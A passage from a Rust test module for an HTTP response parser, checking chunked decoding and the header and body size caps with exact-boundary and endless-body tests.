        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
    }

    #[test]
    fn a_chunk_extension_is_ignored_and_the_data_kept() {
        let out = match dechunk(b"4;name=value\r\nWiki\r\n0\r\n\r\n") {
            Ok(out) => out,
            Err(e) => panic!("a legal chunk extension was refused: {e}"),
        };
        assert_eq!(out, b"Wiki");
    }

    #[test]
    fn the_terminator_alone_is_an_empty_body() {
        let out = match dechunk(b"0\r\n\r\n") {
            Ok(out) => out,
            Err(e) => panic!("a legal empty chunked body was refused: {e}"),
        };
        assert!(out.is_empty());
    }

    #[test]
    fn a_header_block_of_exactly_the_limit_is_accepted() {
        // The boundary belongs to the accepted side.  The block is built to
        // land on the byte, and the assertion before parsing is what proves
        // the test is about the boundary and not about a number that happens
        // to be close to it.
        let prefix = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nX-Filler: ";
        let filler = MAX_HEADER_BYTES - prefix.len() - 4;
        let mut raw = prefix.to_vec();
        raw.extend(std::iter::repeat(b'a').take(filler));
        raw.extend_from_slice(b"\r\n\r\n");
        assert_eq!(raw.len(), MAX_HEADER_BYTES, "the test is not on the boundary");

        let (status, body, reusable) = parse(&raw);
        assert_eq!(status, 200);
        assert!(body.is_empty());
        assert!(reusable);
    }

    #[test]
    fn a_header_block_one_byte_past_the_limit_is_refused() {
        let prefix = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nX-Filler: ";
        let filler = MAX_HEADER_BYTES - prefix.len() - 4 + 1;
        let mut raw = prefix.to_vec();
        raw.extend(std::iter::repeat(b'a').take(filler));
        raw.extend_from_slice(b"\r\n\r\n");
        assert_eq!(raw.len(), MAX_HEADER_BYTES + 1);

        let (kind, message) = refuse(&raw);
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("too large"), "{message}");
    }

    /// A reader that serves a header block and then never ends.
    ///
    /// The body cap exists because the peer decides how much there is; a
    /// `Cursor` cannot show that, because it stops on its own.
    struct HeadThenEndless {
        head: Vec<u8>,
        pos: usize,
    }

    impl Read for HeadThenEndless {
        fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
            if self.pos < self.head.len() {
                let n = (self.head.len() - self.pos).min(buf.len());
                buf[..n].copy_from_slice(&self.head[self.pos..self.pos + n]);
                self.pos += n;
                return Ok(n);
            }
            for byte in buf.iter_mut() {
                *byte = b'z';
            }
            Ok(buf.len())
        }
    }

    #[test]
    fn a_body_with_no_length_and_no_end_stops_at_the_limit() {
        // Without the cap this call does not return: the reader never ends.
        // It is not a timing test -- it either returns an error at the cap or
        // it does not return at all, and the suite would time out.
        let mut reader = HeadThenEndless {
            head: b"HTTP/1.1 200 OK\r\nX-Nothing: else\r\n\r\n".to_vec(),
            pos: 0,
        };
        match read_http_response(&mut reader) {
            Err(e) => {
                assert_eq!(e.kind(), io::ErrorKind::InvalidData);
                assert!(e.to_string().contains("larger than"), "{e}");
            }
            Ok((_, body, _)) => panic!("accepted an endless body of {} bytes", body.len()),
        }
    }

    #[test]
    fn a_body_of_exactly_the_limit_is_accepted() {
        // The cap is on the accepted side.  The body is built to the byte, so
        // the assertion below is what makes this a boundary test and not a
        // test of a number near one.
        let mut raw =
            format!("HTTP/1.1 200 OK\r\nContent-Length: {MAX_BODY_BYTES}\r\n\r\n").into_bytes();
        raw.extend(std::iter::repeat(b'b').take(MAX_BODY_BYTES));
        let (status, body, _) = parse(&raw);
        assert_eq!(status, 200);
        assert_eq!(body.len(), MAX_BODY_BYTES);
    }

    #[test]
    fn a_body_one_byte_past_the_limit_is_refused() {
        // No content length and no chunking: the only thing that can refuse
        // this body is the cap on the to-eof path.
        let mut raw = b"HTTP/1.1 200 OK\r\nX-Nothing: else\r\n\r\n".to_vec();
        raw.extend(std::iter::repeat(b'b').take(MAX_BODY_BYTES + 1));
        let (kind, message) = refuse(&raw);
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("larger than"), "{message}");
    }

    #[test]
    fn an_announced_body_over_the_limit_is_refused_before_it_is_read() {
        // Nothing follows the headers, so an implementation that started
        // reading would answer "short body"; the cap answers instead.
        let raw = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n",
            MAX_BODY_BYTES + 1
        );
        let (kind, message) = refuse(raw.as_bytes());
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("announces"), "{message}");
    }

    #[test]
    fn finds_header_terminator() {
        let buf = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        assert_eq!(find_subslice(buf, b"\r\n\r\n"), Some(buf.len() - 4));
    }
}
